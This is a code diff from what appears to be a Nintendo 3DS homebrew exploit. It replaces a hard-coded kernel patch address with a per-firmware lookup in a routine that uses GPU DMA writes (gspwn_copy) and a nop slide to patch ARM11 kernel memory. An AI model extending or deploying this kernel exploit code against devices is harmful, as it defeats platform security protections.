@@ -2,6 +2,7 @@
 
 #include <stddef.h>
 #include <stdint.h>
+#include "firmcompat.h"
 #include "../mset/draw.h"
 
 // MSET functions
@@ -86,13 +87,12 @@ void memchunk_arm11hax(void (*func)())
 
     // arm11_buffer is the location that is copied *from* when using gspwn_copy
     uint32_t *arm11_buffer = (uint32_t *)0x14002000;
-    uint32_t kernel_patch_address = 0xEFF83C97;  // TODO: Change this according to firmware
     arm11_buffer[0] = 1;
-    arm11_buffer[1] = kernel_patch_address;
+    arm11_buffer[1] = fw->kernel_patch_address;
     arm11_buffer[2] = 0;
     arm11_buffer[3] = 0;
 
-    gspwn_copy(mem_hax_mem_free, arm11_buffer, 0x10, kernel_patch_address, 4);
+    gspwn_copy(mem_hax_mem_free, arm11_buffer, 0x10, fw->kernel_patch_address, 4);
     print("Did gspwn copy");
 
     svcControlMemory(&tmp_addr, mem_hax_mem, NULL, 0x1000, 1 /* MEMOP_FREE */, 0);
@@ -101,8 +101,8 @@ void memchunk_arm11hax(void (*func)())
     build_nop_slide(arm11_buffer, 0x4000);
     print("Built nop slide");
 
-    int gsp_addr = 0x14000000;
-    int fcram_code_addr = 0x03E6D000;
+    uint32_t gsp_addr = 0x14000000;
+    uint32_t fcram_code_addr = 0x03E6D000;
     gspwn_copy((void *)(gsp_addr + fcram_code_addr + 0x4000), arm11_buffer,
                0x10000, 0xE1A00000, 0);
     print("Copied nop slide");
